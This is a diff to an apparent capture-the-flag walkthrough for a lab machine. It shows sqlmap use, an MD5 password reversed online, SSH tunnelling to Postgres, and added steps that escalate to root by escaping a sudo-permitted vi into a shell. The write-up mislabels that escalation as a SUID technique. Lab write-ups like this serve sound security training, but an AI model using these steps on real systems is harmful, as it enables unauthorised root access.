@@ -130,7 +130,7 @@ sqlmap -u http://10.129.95.174/dashboard.php --forms --cookie="PHPSESSID=kcr9hel
 
 First 3 characters are a tip about the hash. Using https://md5.gromweb.com/?md5=2d58e0637ec1e94cdfba3d1c26b67d01 we obtain: The MD5 hash: 2d58e0637ec1e94cdfba3d1c26b67d01 was succesfully reversed into the string: P@s5w0rd!postgres
 
-Now, as we couldn't spot [port 5432 (postgres)](5432-postgres.md) open, we will use port-tunneling with ssh.
+Now, as we couldn't spot [port 5432 (postgres)](5432-postgresql.md) open, we will use port-tunneling with ssh.
 
 ```bash
 ssh UserNameInTheAttackedMachine@IPOfTheAttackedMachine -L 1234:localhost:5432 
@@ -141,6 +141,36 @@ ssh postgres@10.129.95.174 -L 1234:localhost:5432
 
 ```
 
+After this, we can "cat" the user.txt file. 
+
+To escalate provileges, first we can use some commands for basic reconnaissance:
+
+```bash
+whoami
+id
+sudo -l
+```
+
+Last one provides us with interesting output:
+
+```
+User postgres may run the following commands on vaccine:
+    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
+```
+
+We can abuse [suid binaries technique](suid-binaries) to gain access to root user:
+
+```bash
+ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
+:set shell=/bin/sh
+:shell
+```
+
+Once there, print out root flag:
+
+```bash
+cat /root/root.txt
+```
 
 
 
